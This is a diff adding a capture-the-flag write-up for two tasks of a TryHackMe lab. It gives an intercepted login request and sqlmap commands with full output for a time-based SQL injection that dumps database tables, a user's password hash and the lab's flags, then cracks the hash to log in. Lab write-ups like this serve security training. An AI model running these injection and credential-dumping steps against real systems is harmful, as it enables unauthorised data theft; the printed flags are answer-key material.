@@ -132,3 +132,217 @@ Let's check the **source page** of http://[IP]/login
 ---
 ### Easter 4
 *hint*:time-based sqli
+
+Start **Burp Suite** in order to intercept the request. Try to log inand intercept the request
+```
+POST /login/ HTTP/1.1
+Host: 10.10.207.62
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Origin: http://10.10.207.62
+Connection: close
+Referer: http://10.10.207.62/login/
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin&submit=submit
+```
+We noticed the request type: **POST**. Save the request as a text file.Now, we can start **sqlmap** ^^
+
+It is important to be patient. This approach takes few minutes.
+```
+sqlmap -r ~/Downloads/request.txt --dbs
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.2#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:16:37 /2022-04-02/
+
+[19:16:37] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
+........
+[19:18:42] [INFO] retrieved:
+[19:18:52] [INFO] adjusting time delay to 3 seconds due to good response times
+inform
+[19:20:04] [ERROR] invalid character detected. retrying..
+[19:20:04] [WARNING] increasing time delay to 4 seconds
+ation_schema
+[19:22:46] [INFO] retrieved: THM_f0und_m3
+.......
+```
+We found the database name **THM_f0und_m3**. Now, it's time to dump the DB ^^
+```
+sqlmap -r ~/Downloads/request.txt -D THM_f0und_m3 --tables
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.2#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:44:41 /2022-04-02/
+
+[19:44:41] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
+......
+[19:47:18] [INFO] the back-end DBMS is MySQL
+[19:47:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+web server operating system: Linux Ubuntu 12.10 or 13.04 or 12.04 (Raring Ringtail or Quantal Quetzal or Precise Pangolin)
+web application technology: Apache 2.2.22, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+[19:47:18] [INFO] fetching tables for database: 'THM_f0und_m3'
+[19:47:18] [INFO] fetching number of tables for database 'THM_f0und_m3'
+[19:47:19] [INFO] retrieved:
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+2
+[19:47:39] [INFO] retrieved: nothing_inside
+[19:52:04] [INFO] retrieved: user
+Database: THM_f0und_m3
+[2 tables]
++----------------+
+| user           |
+| nothing_inside |
++----------------+
+
+```
+We found tables. Let's try each.
+```
+sqlmap.py -r ~/Downloads/request.txt  -D THM_f0und_m3 -T nothing_inside --columns
+
+
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:52:44 /2022-04-02/
+
+[19:52:44] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
+[19:52:44] [WARNING] unable to write to the output directory '/Users/laurentnebout/.local/share/sqlmap/output' ([Errno 13] Permission denied: '/Users/laurentnebout/.local/share/sqlmap/output/rUEb'). Using temporary directory '/var/folders/dj/0j
+..........
+[19:56:04] [INFO] retrieved: varchar(30)
+Database: THM_f0und_m3
+Table: nothing_inside
+[1 column]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| Easter_4 | varchar(30) |
++----------+-------------+
+
+[19:57:24] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutput9uxpf5cl/10.10.207.62'
+
+```
+Because we found only one field, we can easily guess we will find the flag inside. 
+```
+sqlmap -r ~/Downloads/request.txt -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.2#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:58:19 /2022-04-02/
+
+[19:58:19] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
+.....
+select Easter_4 from nothing_inside: 'THM{1nj3c7_l1k3_4_b055}'
+[20:07:32] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputcu_7nz4v/10.10.207.62'
+
+[*] ending @ 20:07:32 /2022-04-02/
+```
+**Answer** 
+#### THM{1nj3c7_l1k3_4_b055}
+---
+### Easter 5
+*hint*:Another sqli
+
+Now , let's check the table **user**
+```
+sqlmap.py -r ~/Downloads/request.txt -D THM_f0und_m3 -T user --columns
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:07:53 /2022-04-02/
+
+[20:07:53] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
+[20:07:53] [WARNING] unable to write to the output directory '/Users/laurentnebout/.local/share/sqlmap/output' ([Errno 13] Permission denied: '/Users/laurentnebout/.local/share/sqlmap/output/QmmU'). Using temporary directory '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputec6ov6w2' instead
+........
+Database: THM_f0und_m3
+Table: user
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| password | varchar(40) |
+| username | varchar(30) |
++----------+-------------+
+
+[20:14:11] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputec6ov6w2/10.10.207.62'
+
+[*] ending @ 20:14:11 /2022-04-02/
+```
+Let's try to find a valid username and password ^^
+```
+sqlmap -r ~/Downloads/request.txt -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.6.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:20:37 /2022-04-02/
+
+[20:20:37] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
+[20:20:37] [WARNING] unable to write to the output directory '/Users/laurentnebout/.local/share/sqlmap/output' ([Errno 13] Permission denied: '/Users/laurentnebout/.local/share/sqlmap/output/FVIx'). Using temporary directory '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputciyn_mgt' instead
+.........
+[20:31:13] [ERROR] invalid character detected. retrying..
+[20:31:13] [WARNING] increasing time delay to 4 seconds
+ce guy, say hello for me
+select username,password from user [2]:
+[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
+[*] Skidy, He is a nice guy, say hello for me
+
+[20:37:26] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputciyn_mgt/10.10.207.62'
+
+[*] ending @ 20:37:26 /2022-04-02/
+```
+
+Now we cand try to decrypt the **password** of **DesKel**.
+- First: Go to [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/). We found this hash is **MD4** or **MD5**
+- Second: Go to [MD5 hashing website](https://md5hashing.net/) and decrypt it
+	- Result: **cutie**
+- Third: On the login page try the combo **DesKel / Cutie**
+**Answer** 
+#### THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql} 
+---
+### Easter 6
+*hint*:Look out for the response header.
+
